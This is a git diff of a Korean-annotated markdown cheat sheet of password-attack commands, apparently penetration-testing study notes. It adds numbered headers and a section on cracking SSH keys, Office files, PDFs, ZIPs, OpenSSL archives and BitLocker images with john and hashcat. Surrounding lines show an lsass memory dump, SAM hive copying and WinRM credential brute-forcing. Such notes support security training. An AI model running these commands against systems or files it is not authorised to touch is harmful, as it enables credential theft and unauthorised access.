@@ -1,4 +1,4 @@
-# John The Ripper
+# 1.John The Ripper
 
 ### Single Crack Mode
 ```john --format=<hash_type> <hash or hash_file>```
@@ -36,7 +36,7 @@ john --wordlist=<wordlist.txt> server_doc.hash
 - 툴 위치 검색 : ```$ locate *2john*```
 
 <br/><br/>
-# Remote Password Attacks
+# 2.Remote Password Attacks
 
 ### CrackMapExec(NetExec) - WinRM
 ```crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>```<br/>
@@ -65,7 +65,7 @@ john --wordlist=<wordlist.txt> server_doc.hash
 ```smbclient -U user \\\\192.168.1.1\\SHARENAME```
 
 <br/><br/>
-# Password 변형
+# 3.Password 변형
 
 ### Hashcat Rule 기반 Wordlist 생성
 ```
@@ -98,7 +98,7 @@ $! c so0 sa@
 예) ```./username-anarchy john marston > username.txt```
 
 <br/><br/>
-# Password 재사용 / 기본 Passwords
+# 4.Password 재사용 / 기본 Passwords
 
 ### Credential Stuffing
 [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
@@ -143,7 +143,7 @@ $! c so0 sa@
 [Default Router Credentials](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)
 
 <br/><br/>
-# Windows Local Password Attacks
+# 5.Windows Local Password Attacks
 
 ## Attacking SAM
 #### reg.exe로 Registry Hives 복사
@@ -196,7 +196,7 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml```
 
 <br/><br/>
-# Linux Local Password Attacks
+# 6.Linux Local Password Attacks
 
 ## 파일 검색
 
@@ -278,3 +278,43 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 
 ### Hashcat으로 MD5 Hash Cracking
 ```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```
+
+<br/><br/>
+# 7.Cracking Files
+
+### SSH Key Cracking
+```
+ssh2john.py SSH.private > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+```
+
+### Cracking Documents
+```
+office2john.py Protected.docx > protected-docx.hash
+john --wordlist=rockyou.txt protected-docx.hash
+```
+
+### Cracking PDFs
+```
+pdf2john.py PDF.pdf > pdf.hash
+john --wordlist=rockyou.txt pdf.hash
+```
+
+### Cracking ZIP
+```
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+```
+
+### Cracking OpenSSL Encrypted Archives (예 : .gzip)
+```
+file GZIP.gzip 
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
+```
+
+### Cracking BitLocker Encrypted Drives
+```
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash
+hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
+```
